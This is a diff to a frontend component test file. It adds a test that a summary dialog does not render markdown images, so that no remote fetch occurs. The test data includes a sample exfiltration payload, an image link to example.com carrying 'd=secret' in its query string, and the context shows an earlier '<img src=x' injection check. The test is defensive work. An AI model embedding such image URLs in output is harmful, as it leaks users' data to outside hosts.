@@ -58,6 +58,23 @@ describe('SummaryDialog', () => {
     expect(screen.getByText(/<img src=x/)).toBeInTheDocument()
   })
 
+  it('never loads a remote image from markdown image syntax in the summary', async () => {
+    // Given a summary carrying a markdown image that would call a remote host
+    vi.mocked(getStudySessionSummary).mockResolvedValueOnce({
+      ...SUMMARY,
+      content: '## Progress\n\n![tracker](https://example.com/x.png?d=secret)',
+    })
+
+    // When the dialog opens
+    render(<SummaryDialog open sessionId="session-1" onClose={vi.fn()} />)
+
+    // Then no image element exists, so nothing is fetched, and the alt text stays readable
+    await screen.findByRole('heading', { name: 'Progress' })
+    expect(screen.queryByRole('img')).not.toBeInTheDocument()
+    expect(document.querySelector('img')).toBeNull()
+    expect(screen.getByText('tracker')).toBeInTheDocument()
+  })
+
   it('says so when the session has no summary', async () => {
     // Given a session without a summary
     vi.mocked(getStudySessionSummary).mockResolvedValueOnce({
